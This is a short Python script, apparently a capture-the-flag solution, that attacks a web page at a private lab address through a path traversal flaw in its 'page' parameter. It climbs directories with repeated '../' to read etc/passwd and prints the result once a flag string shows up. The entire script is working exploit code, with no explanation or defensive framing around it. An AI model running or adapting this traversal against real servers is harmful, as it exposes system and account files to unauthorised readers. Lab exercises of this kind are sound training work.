import requests
from time import sleep
from bs4 import BeautifulSoup

baseUrl = 'http://192.168.56.102/?page='

def searchCurrentPath(path):
    while True:
        path += "../"
        request = requests.get(baseUrl + path + 'etc/passwd')
        soup = BeautifulSoup(request.text, "html.parser")
        ret = str(soup.find("script"))
        if "flag" in ret:
            print(baseUrl + path + 'etc/passwd')
            print(ret)
            break
        sleep(0.1)

def main():
    baseReq = requests.get(baseUrl)
    folder = ""
    searchCurrentPath(folder)

if __name__ == "__main__":
    main()
